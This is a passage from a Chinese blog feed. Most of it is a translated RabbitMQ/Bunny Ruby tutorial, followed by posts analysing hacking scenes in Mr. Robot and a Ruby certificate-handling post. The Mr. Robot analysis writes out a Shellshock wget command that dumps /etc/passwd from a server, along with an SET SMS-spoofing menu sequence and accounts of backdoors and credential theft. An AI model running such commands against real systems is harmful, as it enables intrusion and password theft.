API文档</a>。</p><p>现在我们可以移步教程3学习如何发送相同的消息给多个消费者（consumers）。</p>]]></content>
      
      <categories>
          
          <category> Ruby </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RabbitMQ </tag>
            
            <tag> Ruby </tag>
            
            <tag> 翻译 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>RabbitMQ教程（一）──你好世界</title>
      <link href="/2017/10/01/RabbitMQ%E6%95%99%E7%A8%8B%EF%BC%88%E4%B8%80%EF%BC%89%E2%94%80%E2%94%80%E4%BD%A0%E5%A5%BD%E4%B8%96%E7%95%8C/"/>
      <url>/2017/10/01/RabbitMQ%E6%95%99%E7%A8%8B%EF%BC%88%E4%B8%80%EF%BC%89%E2%94%80%E2%94%80%E4%BD%A0%E5%A5%BD%E4%B8%96%E7%95%8C/</url>
      <content type="html"><![CDATA[<h1 id="RabbitMQ教程（一）──你好世界"><a href="#RabbitMQ教程（一）──你好世界" class="headerlink" title="RabbitMQ教程（一）──你好世界"></a>RabbitMQ教程（一）──你好世界</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>RabbitMQ是一个消息代理。它的工作就是接收和转发消息。你可以把它想像成一个邮局：你把信件放入邮箱，邮递员就会把信件投递到你的收件人处。在这个比喻中，RabbitMQ就扮演着邮箱、邮局以及邮递员的角色。</p><p>RabbitMQ和邮局的主要区别在于，它不是处理纸张，而是接收、存储和转发消息（message）──二进制数据。</p><p>下面是RabbitMQ和消息所涉及到的一些术语：</p><ul><li><code>生产(Producing)</code>的意思就是发送。发送消息的程序就是一个生产者(producer)。我们一般用”P”来表示:</li></ul><p><img src="https://www.rabbitmq.com/img/tutorials/producer.png" alt="producer"></p><ul><li><code>队列(queue)</code>就是存在于RabbitMQ中邮箱的名称。虽然消息的传输经过了RabbitMQ和你的应用程序，但是它只能被存储于队列当中。实质上队列就是个巨大的消息缓冲区，它的大小只受主机内存和硬盘限制。多个生产者（producers）可以把消息发送给同一个队列，同样，多个消费者（consumers）也能够从同一个队列（queue）中获取数据。队列可以绘制成这样（图上是队列的名称）：</li></ul><p><img src="https://www.rabbitmq.com/img/tutorials/queue.png" alt="queue"></p><ul><li><code>消费（Consuming）</code>，和接收(receiving)是同一个意思。一个消费者（consumer）就是一个等待获取消息的程序。我们把它绘制为”C”：</li></ul><p><img src="https://www.rabbitmq.com/img/tutorials/consumer.png" alt="consumer"></p><p>需要指出的是生产者、消费者、代理需不要待在同一个设备上；事实上大多数应用也确实不在会将他们放在一台机器上。</p><h2 id="你好世界"><a href="#你好世界" class="headerlink" title="你好世界!"></a>你好世界!</h2><p>（使用Bunny Ruby客户端）</p><p>接下来我们用Ruby写两个小程序。一个发送单条消息的生产者（producer）和一个接收消息并将其输出的消费者（consumer）。我们将详细介绍<a href="http://rubybunny.info/" target="_blank" rel="noopener">Bunny</a> API中的一些细节，从传递”Hello World”消息，这种简单的事情开始。</p><p>下图中，“P”代表生产者，“C”代表消费者，中间的盒子代表为消费者保留的消息缓冲区，也就是我们的队列。</p><p><img src="https://www.rabbitmq.com/img/tutorials/python-one.png" alt="python-one"></p><p>生产者（producer）把消息发送到一个名为“hello”的队列中。消费者（consumer）从这个队列中获取消息。</p><blockquote><p><strong>Bunny客户端</strong></p><p>RabbitMQ有多种协议，教程中使用的是AMQP 0.9.1协议。这是一个用于消息传递的开放、通用的协议。针对<a href="http://rabbitmq.com/devtools.html" target="_blank" rel="noopener">不同编程语言</a>有大量的RabbitMQ客户端可用。在这个系列教程中，RabbitMQ团队推荐使用Bunny这个最常用的Ruby客户端。</p><p>首先，使用<a href="http://rubygems.org/" target="_blank" rel="noopener">Rubygems</a>安装Bunny：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gem install bunny --version &quot;&gt;= 2.6.4&quot;</span><br></pre></td></tr></table></figure></p></blockquote><p>现在，我们已经安装了Bunny，我们可以写点代码了。</p><h3 id="发送"><a href="#发送" class="headerlink" title="发送"></a>发送</h3><p><img src="https://www.rabbitmq.com/img/tutorials/sending.png" alt="sending"></p><p>我们称消息生产者为<code>send.rb</code>，消息消费者为<code>receive.rb</code>。生产者将先连接RabbitMQ，发送一个消息，然后直接退出。</p><p>在<code>send.rb</code>中，我们先应用库：<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env ruby</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">'bunny'</span></span><br></pre></td></tr></table></figure></p><p>然后连接RabbitMQ服务器<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">connection = Bunny.new</span><br><span class="line">connection.start</span><br></pre></td></tr></table></figure></p><p>这里的连接帮我们简化了一些socket连接事项，比如协议版本、认证等等。现在我们已经用默认配置跟本地机器的代理建立了连接。</p><p>如果你想连接到其他机器的代理上，需要把<code>:hostname</code>改为指定的名字或IP地址。<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">connection = Bunny.new(<span class="symbol">hostname:</span> <span class="string">'rabbit.local'</span>)</span><br><span class="line">connection.start</span><br></pre></td></tr></table></figure></p><p>接下来，我们创建一个通道，大部分的API功能都是在这里完成的：<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">channel = connection.create_channel</span><br></pre></td></tr></table></figure></p><p>在发送消息之前，我们需要声明一个队列，然后推送消息到这个队列中：<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">queue = channel.queue(<span class="string">'hello'</span>)</span><br><span class="line"></span><br><span class="line">channel.default_exchange.publish(<span class="string">'Hello World!'</span>, <span class="symbol">routing_key:</span> queue.name)</span><br><span class="line">puts <span class="string">" [x] Sent 'Hello World!'"</span></span><br></pre></td></tr></table></figure></p><p>最后，我们需要关闭这个连接：<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">connection.close()</span><br></pre></td></tr></table></figure></p><p><a href="https://github.com/rabbitmq/rabbitmq-tutorials/blob/master/ruby/send.rb" target="_blank" rel="noopener">完整的<code>send.rb</code>代码</a></p><blockquote><p>发送不成功！</p><p>如果这是你第一次使用RabbitMQ，并且没有看到“Sent”消息出现在屏幕上，你可能会抓耳挠腮不知所以。这也许是因为没有足够的磁盘空间给代理使用所造成的（代理默认需要200MB的空闲空间），所以它才会拒绝接收消息。查看一下代理的日志文件进行确认，如果需要的话也可以减少限制。<a href="http://www.rabbitmq.com/configure.html#config-items" target="_blank" rel="noopener">配置文件文档</a>会告诉你如何更改磁盘空间限制（disk_free_limit）。</p></blockquote><h3 id="接收"><a href="#接收" class="headerlink" title="接收"></a>接收</h3><p>之前是我们的生产者。我们的消费者是从RabbitMQ中取消息，和生产者只推送一条消息不同，我们将会一直监听消息，并将它们打印出来。</p><p><img src="https://www.rabbitmq.com/img/tutorials/receiving.png" alt="receiving"></p><p>和<code>send.rb</code>一样，<code>receive.rb</code>代码也要先引入库：<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env ruby</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">'bunny'</span></span><br></pre></td></tr></table></figure></p><p>初始化和生产者一样，我们打开连接和通道，并声明一个队列用来消费。需要注意的是这里队列名要和生产者的一直。<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">connection = Bunny.new</span><br><span class="line">connection.start</span><br><span class="line"></span><br><span class="line">channel = connection.create_channel</span><br><span class="line">queue = channel.queue(<span class="string">'hello'</span>)</span><br></pre></td></tr></table></figure></p><p>注意在这里我们也要声明队列。因为消费者可能在生产者之前启动，我们要确保在从队列里去消息前，这个队列已被创建。</p><p>现在我们要告诉服务器把消息交付给我们。由于服务器是异步的推送给我们消息，我们需要提供一个回调函数，当RabbitMQ推送消息给我们时就执行回调函数。这里用<code>Bunny::Queue#subscribe</code>来实现。<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">begin</span></span><br><span class="line">  puts <span class="string">' [*] Waiting for messages. To exit press CTRL+C'</span></span><br><span class="line">  queue.subscribe(<span class="symbol">block:</span> <span class="literal">true</span>) <span class="keyword">do</span> <span class="params">|_delivery_info, _properties, body|</span></span><br><span class="line">    puts <span class="string">" [x] Received <span class="subst">#&#123;body&#125;</span>"</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">rescue</span> Interrupt =&gt; <span class="number">_</span></span><br><span class="line">  connection.close</span><br><span class="line"></span><br><span class="line">  exit(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure></p><p><code>Bunny::Queue#subscribe</code>使用了<code>:block</code>选项来阻塞线程（因为我们不想脚本立马执行完）。</p><p><a href="https://github.com/rabbitmq/rabbitmq-tutorials/blob/master/ruby/receive.rb" target="_blank" rel="noopener">完整的<code>receive.rb</code>代码</a>。</p><h3 id="整合到一起"><a href="#整合到一起" class="headerlink" title="整合到一起"></a>整合到一起</h3><p>现在我们可以运行前面的脚本了。在终端里，运行消费者：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby receive.rb</span><br></pre></td></tr></table></figure></p><p>然后运行生产者：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby send.rb</span><br></pre></td></tr></table></figure></p><p>消费者会打印从RabbitMQ获得的生产发送的消息。消费者将会一直运行，等待消息（通过Ctrl-C来中止它），所以在另一个终端运行生产者吧。</p><blockquote><p><strong>列出所有队列</strong></p><p>你也许希望查看RabbitMQ中有哪些队列、有多少消息在队列中。此时你可以使用<code>rabbitmqctl</code>工具（使用有权限的用户）：</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo rabbitmqctl list_queues</span><br></pre></td></tr></table></figure><blockquote><p>在Windows中不需要sudo命令:</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rabbitmqctl.bat list_queues</span><br></pre></td></tr></table></figure><p>是时候移步到第二部分了，我们将会建立一个简单的工作队列（work queue）。</p>]]></content>
      
      <categories>
          
          <category> Ruby </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RabbitMQ </tag>
            
            <tag> Ruby </tag>
            
            <tag> 翻译 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>技术分析之黑客军团第二季</title>
      <link href="/2016/11/13/%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90%E4%B9%8B%E9%BB%91%E5%AE%A2%E5%86%9B%E5%9B%A2%E7%AC%AC%E4%BA%8C%E5%AD%A3/"/>
      <url>/2016/11/13/%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90%E4%B9%8B%E9%BB%91%E5%AE%A2%E5%86%9B%E5%9B%A2%E7%AC%AC%E4%BA%8C%E5%AD%A3/</url>
      <content type="html"><![CDATA[<h1 id="技术分析之黑客军团第二季"><a href="#技术分析之黑客军团第二季" class="headerlink" title="技术分析之黑客军团第二季"></a>技术分析之黑客军团第二季</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这一季中牵扯到技术方面的剧情相对第一季少一点，而且有几个地方是一笔带过，我就没有详细分析。我从中挑四个场景，简单分析一下。</p><a id="more"></a><h2 id="第一集"><a href="#第一集" class="headerlink" title="第一集"></a>第一集</h2><h3 id="Cryptowall"><a href="#Cryptowall" class="headerlink" title="Cryptowall"></a>Cryptowall</h3><p><img src="http://7oxj8e.com1.z0.glb.clouddn.com/Mr%20Robot/S02E01-cryptowall.jpg" alt="Cryptowall"></p><p>从后面的剧情可以看出，这个是一个勒索软件。而且，他们已经集成到<code>SET</code>（在第一季中有提到）中，设置一下服务器的地址和密码，之后写到U盘中，并添加了一个<code>autorun.inf</code>文件，这个文件作用就是：U盘插入电脑后会自动运行<code>fsocietyM.exe</code>程序。</p><h2 id="第八集"><a href="#第八集" class="headerlink" title="第八集"></a>第八集</h2><h3 id="Android-Stagefright"><a href="#Android-Stagefright" class="headerlink" title="Android Stagefright"></a>Android Stagefright</h3><p><img src="http://7oxj8e.com1.z0.glb.clouddn.com/Mr%20Robot/S02E08-Android-Stagefright.jpg" alt="Android Stagefright"></p><p>这个场景中使用的是<code>Android Stagefright</code>漏洞利用，一个很真实场景。对话先从手机型号开始，然后谈到安卓手机和苹果手机哪个好，技术人员喜欢那数字说话，所以各自不服，就跑个分。女黑客在自己的电脑上先生成一个<code>mp4</code>文件，将这个文件嵌入到伪装的测速网站中，让胖子黑客去访问。女黑客利用<code>Stagefright</code>漏洞，成功拿到胖子黑客手机的<code>root</code>权限。</p><h2 id="第九集"><a href="#第九集" class="headerlink" title="第九集"></a>第九集</h2><h3 id="mimitakz"><a href="#mimitakz" class="headerlink" title="mimitakz"></a>mimitakz</h3><p><img src="http://7oxj8e.com1.z0.glb.clouddn.com/Mr%20Robot/S02E09-mimitakz.jpg" alt="mimitakz"></p><p><code>Angela</code>先把<code>Rubber Ducky</code>插到<code>Joseph</code>的电脑（<code>Rubber Ducky</code>在第六集中有提到，当时只是把它当作备用方案，当时没有使用，<code>Angela</code>在这集中用了），使用的时候需要给它装一个SD卡，它被插入电脑中，会自动运行里面的<code>mimitakz</code>，这个程序会扫描电脑中各种帐号和密码，然后保存到SD卡中。之后<code>Angela</code>从SD卡中找到了<code>Joseph</code>的帐号和密码。</p><h2 id="第十一集"><a href="#第十一集" class="headerlink" title="第十一集"></a>第十一集</h2><h3 id="Red-Wheelbarrow-BBQ"><a href="#Red-Wheelbarrow-BBQ" class="headerlink" title="Red Wheelbarrow BBQ"></a>Red Wheelbarrow BBQ</h3><p><img src="http://7oxj8e.com1.z0.glb.clouddn.com/Mr%20Robot/S02E11-Red-Whellbarrow-BBQ.jpg" alt="Red Wheelbarrow BBQ"></p><p>宣传单正面有一堆数字，它们大小不超过26，可以推测：1对应a、2对应b、…，26对应z，转换一下得到：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gurcreevacntrfjvyyuryclbhsvaqlbhepnyyvatohgqbagorqhcrqphgqbjagurjbbqfgurlorreqbf</span><br></pre></td></tr></table></figure></p><p>上面这串字母是<code>ROT-13</code>加密之后的字符串，去<a href="http://decode.org/" target="_blank" rel="noopener">DECODE ORG</a>（去看看吧，有惊喜）解密，得到：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">the perrin pages will help you find your calling but dont be duped cut down the woods they be erdos</span><br></pre></td></tr></table></figure></p><p>这句话里有提到两个数列：Perrin numbers和Erdos numbers。在宣传单的背面还有一堆数字，从其中删掉上面两个数列中的数字，得到：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">32 35 31 41 53 45 43 52 45 54</span><br></pre></td></tr></table></figure></p><p>很明显是<code>ASCII码</code>，我们去<a href="http://www.ascii2hex.com/" target="_blank" rel="noopener">ASCII 2 Hex</a>解码，得到：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">251ASECRET</span><br></pre></td></tr></table></figure></p><p>这是一个电话号码，打开手机拨号的键盘，照着按键就可以得到以下号码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(251) 273-2738</span><br></pre></td></tr></table></figure></p><p>其实，这一套流程是从<a href="http://potatohatsecurity.tumblr.com/post/94565729529/defcon-22-badge-challenge-walkthrough" target="_blank" rel="noopener">DEFCON 22 Badge Challenge</a>那里照搬过来的，稍微调整了一下形式。</p>]]></content>
      
      <categories>
          
          <category> 美剧 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 美剧 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>技术分析之黑客军团第一季</title>
      <link href="/2016/10/30/%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90%E4%B9%8B%E9%BB%91%E5%AE%A2%E5%86%9B%E5%9B%A2%E7%AC%AC%E4%B8%80%E5%AD%A3/"/>
      <url>/2016/10/30/%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90%E4%B9%8B%E9%BB%91%E5%AE%A2%E5%86%9B%E5%9B%A2%E7%AC%AC%E4%B8%80%E5%AD%A3/</url>
      <content type="html"><![CDATA[<h1 id="技术分析之黑客军团第一季"><a href="#技术分析之黑客军团第一季" class="headerlink" title="技术分析之黑客军团第一季"></a>技术分析之黑客军团第一季</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本文只是对居中用到黑客工具（非常用，像<code>ping</code>等常用工具略过）进行分析，不对剧情进行分析解释。</p><a id="more"></a><h2 id="第一集"><a href="#第一集" class="headerlink" title="第一集"></a>第一集</h2><h3 id="elpscrk"><a href="#elpscrk" class="headerlink" title="elpscrk"></a>elpscrk</h3><p><img src="http://7oxj8e.com1.z0.glb.clouddn.com/Mr%20Robot/S01E01-elpscrk.jpg" alt="elpscrk"></p><p>图中用到<code>elpscrk</code>命令，这个并不是<code>Linux</code>命令，根据使用过程，看出是用自动破解用户密码的，所以猜测是<code>Elliot</code>自己写的工具，全称可能是：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ELliot&apos;s PaSsword CRacKer</span><br></pre></td></tr></table></figure></p><h3 id="astsu"><a href="#astsu" class="headerlink" title="astsu"></a>astsu</h3><p><img src="http://7oxj8e.com1.z0.glb.clouddn.com/Mr%20Robot/S01E01-astsu.jpg" alt="astsu"></p><p>同样，<code>astsu</code>也是一个没有见过的命令，从截图中可以看出，<code>Elliot</code>在对服务器操作过程中经常用到，根据使用，推测一下选项的解释：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">info - 显示服务器信息</span><br><span class="line">backup - 显示备份服务器</span><br><span class="line">short - 显示简略信息</span><br><span class="line">ifconfig - 这是一个Linux命令，用来配置网络接口的</span><br></pre></td></tr></table></figure></p><p>根据以上信息，推测是他们自己开发一套服务器操作工具，全称可能如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">A Server sTatuS Util</span><br></pre></td></tr></table></figure></p><h2 id="第二集"><a href="#第二集" class="headerlink" title="第二集"></a>第二集</h2><h3 id="Bash-Shellshock"><a href="#Bash-Shellshock" class="headerlink" title="Bash Shellshock"></a>Bash Shellshock</h3><p><img src="http://7oxj8e.com1.z0.glb.clouddn.com/Mr%20Robot/S01E02-Bash%20Shellshock.jpg" alt="Bash Shellshock"></p><p>这个截图是<code>Elliot</code>在黑<code>E公司</code>的邮件服务器，用的是去年的非常有名的漏洞<code>Bash Shellshock</code>（中文：破壳）。用以下命令拿到服务器的<code>/etc/passwd</code>文件，保存到本地的<code>status</code>文件中：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget -U <span class="string">"() [test;];echo \"Content-type: text/plain\"; echo; echo; /bin/cat /etc/passwd"</span> http://evilcorp-intl.com/login.email.srf?wa=wsignial.0&amp;rpsnv=4d</span><br></pre></td></tr></table></figure></p><p>之后就是用<code>john</code>工具来破解<code>status</code>文件中帐号的密码。</p><h2 id="第五集"><a href="#第五集" class="headerlink" title="第五集"></a>第五集</h2><h3 id="Social-Engineering-Toolkit"><a href="#Social-Engineering-Toolkit" class="headerlink" title="Social-Engineering Toolkit"></a>Social-Engineering Toolkit</h3><p><img src="http://7oxj8e.com1.z0.glb.clouddn.com/Mr%20Robot/S01E05-Social-Engineering%20Toolkit.jpg" alt="SET"></p><p>这里使用的是<code>Social-Engineering Toolkit</code>（社会工程学工具箱，简称SET），用了<code>SMS Spoofing</code>攻击，给那个主管发了一条短信。过程如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"> Select from the menu:</span><br><span class="line"></span><br><span class="line">   1) Social-Engineering Attacks</span><br><span class="line">   ...</span><br><span class="line"></span><br><span class="line">  99) Return back to the main menu.</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span>&gt; 1</span><br><span class="line"></span><br><span class="line"> Select from the menu:</span><br><span class="line"></span><br><span class="line">   ...</span><br><span class="line">   7) SMS Spoofing Attack Vector</span><br><span class="line">   ...</span><br><span class="line"></span><br><span class="line">  99) Return back to the main menu.</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span>&gt; 7</span><br><span class="line"></span><br><span class="line"> Select from the menu:</span><br><span class="line"></span><br><span class="line">   1) Perform a SMS Spoofing Attack</span><br><span class="line">   ...</span><br><span class="line"></span><br><span class="line">  99) Return back to the main menu.</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span>&gt; 1</span><br><span class="line"></span><br><span class="line"> Select from the menu:</span><br><span class="line"></span><br><span class="line">   1) SMS Attack Single Phone Number</span><br><span class="line">   ...</span><br><span class="line"></span><br><span class="line">  99) Return back to the main menu.</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span>&gt; 1</span><br><span class="line"></span><br><span class="line">Send SMS to: ...</span><br></pre></td></tr></table></figure></p><h2 id="第六集"><a href="#第六集" class="headerlink" title="第六集"></a>第六集</h2><h3 id="Aircrack-ng"><a href="#Aircrack-ng" class="headerlink" title="Aircrack-ng"></a>Aircrack-ng</h3><p><img src="http://7oxj8e.com1.z0.glb.clouddn.com/Mr%20Robot/S01E06-Aircrack-ng.jpg" alt="Aircracj-ng"><br><code>Aircrack-ng</code>是无线破解常用工具，<code>Elliot</code>安装在他的手机中了，图中表示他在扫描周围的无线信号，但是它们的是<code>wpa2</code>加密方式，意味着很难抓握手包，从而无法实施入侵。</p><h3 id="PLCPackage"><a href="#PLCPackage" class="headerlink" title="PLCPackage"></a>PLCPackage</h3><p>这里<code>Elliot</code>是要入侵监狱的控制系统，这样才能打开监狱的大门。以下是入侵过程：<br>先给自己的笔记本安装一个<code>MultiBlue Dongle</code>，这样笔记本才能有蓝牙功能。<br><img src="http://7oxj8e.com1.z0.glb.clouddn.com/Mr%20Robot/S01E06-MultiBlue%20Dongle.jpg" alt="MultiBlue Dongle"><br>先开启自己的蓝牙设备（截图中右边的终端），并用<code>hciconfig</code>命令查看自己的蓝牙设备信息。在另一个终端（左下的终端）里，用<code>hcitool inq</code>查看可配对设备的信息。<br><img src="http://7oxj8e.com1.z0.glb.clouddn.com/Mr%20Robot/S01E06-bluesniff.jpg" alt="bluesniff"><br>需要说一下<code>bluesniff</code>这个命令（左上的终端），我在网上并没有找到相关信息，根据第一条命令，看出这个工具是现从源码编译的，根据下图推测这个工具的作用是把自己的电脑伪装成对方的蓝牙键盘，这样就可以控制对方的笔记本。<br><img src="http://7oxj8e.com1.z0.glb.clouddn.com/Mr%20Robot/S01E06-keyboard.jpg" alt="keyboard"><br>连上对方笔记本后，开终端，登录自己的<code>ftp</code>服务，下载后门程序，并执行。<br><img src="http://7oxj8e.com1.z0.glb.clouddn.com/Mr%20Robot/S01E06-backdoor.jpg" alt="backdoor"><br>然后，通过<code>ssh</code>登录自己的电脑，使用<code>Meterpreter</code>工具连上后门，通过狱警的笔记本进入监狱网络，在网络中搜索<code>PLC</code>设备，并入侵控制，这样就可以控制监狱的系统啦。<br><img src="http://7oxj8e.com1.z0.glb.clouddn.com/Mr%20Robot/S01E06-attack.jpg" alt="PLCPackage"></p><p>以上是第一季中我觉得可以拿来学习和借鉴的一些场景，当然剧中还有其他攻击场景（常见的或者一笔带过的），我也略过，大家还是自己去看吧。</p>]]></content>
      
      <categories>
          
          <category> 美剧 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 美剧 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>数字证书-Ruby</title>
      <link href="/2016/09/22/%E6%95%B0%E5%AD%97%E8%AF%81%E4%B9%A6-Ruby/"/>
      <url>/2016/09/22/%E6%95%B0%E5%AD%97%E8%AF%81%E4%B9%A6-Ruby/</url>
      <content type="html"><![CDATA[<h1 id="数字证书-Ruby"><a href="#数字证书-Ruby" class="headerlink" title="数字证书-Ruby"></a>数字证书-Ruby</h1><h2 id="证书格式"><a href="#证书格式" class="headerlink" title="证书格式"></a>证书格式</h2><h3 id="PEM"><a href="#PEM" class="headerlink" title="PEM"></a>PEM</h3><p>PEM格式通常用于数字证书认证机构，扩展名为.pem, .crt, .cer, 和 .key。内容为Base64编码的ASCII码文件。服务器认证证书，中级认证证书和私钥都可以储存为PEM格式。<br>DER格式与PEM不同之处在于其使用二进制而不是Base64编码的ASCII。扩展名为.der，但也经常使用.cer用作扩展名，所有类型的认证证书和私钥都可以存储为DER格式。<br><a id="more"></a><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require</span> <span class="string">'openssl'</span></span><br><span class="line"></span><br><span class="line">data = File.read(<span class="string">'cert.pem'</span>)</span><br><span class="line">cert = OpenSSL::X509::Certificate.new data</span><br><span class="line"></span><br><span class="line">puts cert.serial.to_s <span class="comment"># 证书ID</span></span><br><span class="line">puts cert.public_key.to_s <span class="comment"># 证书公钥</span></span><br><span class="line">puts cert.subject.to_s <span class="comment"># 证书主题</span></span><br><span class="line">puts cert.to_pem</span><br><span class="line">puts cert.to_der</span><br></pre></td></tr></table></figure></p><h3 id="PKCS-7"><a href="#PKCS-7" class="headerlink" title="PKCS#7"></a>PKCS#7</h3><p>PKCS#7格式通常以Base64的格式存储，扩展名为.p7b 或 .p7c。PKCS#7只能存储认证证书或证书路径中的证书，不能存储私钥。<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require</span> <span class="string">'openssl'</span></span><br><span class="line"></span><br><span class="line">data = File.read(<span class="string">'cert.p7b'</span>)</span><br><span class="line">pkcs7 = OpenSSL::PKCS7.new data</span><br><span class="line">certs = pkcs7.certificates</span><br><span class="line"></span><br><span class="line">certs.each <span class="keyword">do</span> <span class="params">|cert|</span></span><br><span class="line">  puts cert.serial.to_s <span class="comment"># 证书ID</span></span><br><span class="line">  puts cert.public_key.to_s <span class="comment"># 证书公钥</span></span><br><span class="line">  puts cert.subject.to_s <span class="comment"># 证书主题</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure></p><h3 id="PKCS-12"><a href="#PKCS-12" class="headerlink" title="PKCS#12"></a>PKCS#12</h3><p>PKCS#12格式是以加密的二进制形式存储服务器认证证书，中级认证证书和私钥。扩展名为.pfx 和 .p12，PXF通常用于Windows中导入导出认证证书和私钥。<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require</span> <span class="string">'openssl'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造PKCS#12证书</span></span><br><span class="line">cert = OpenSSL::X509::Certificate.new(File.read(<span class="string">'cert.pem'</span>))</span><br><span class="line">pkey = OpenSSL::PKey::RSA.new(<span 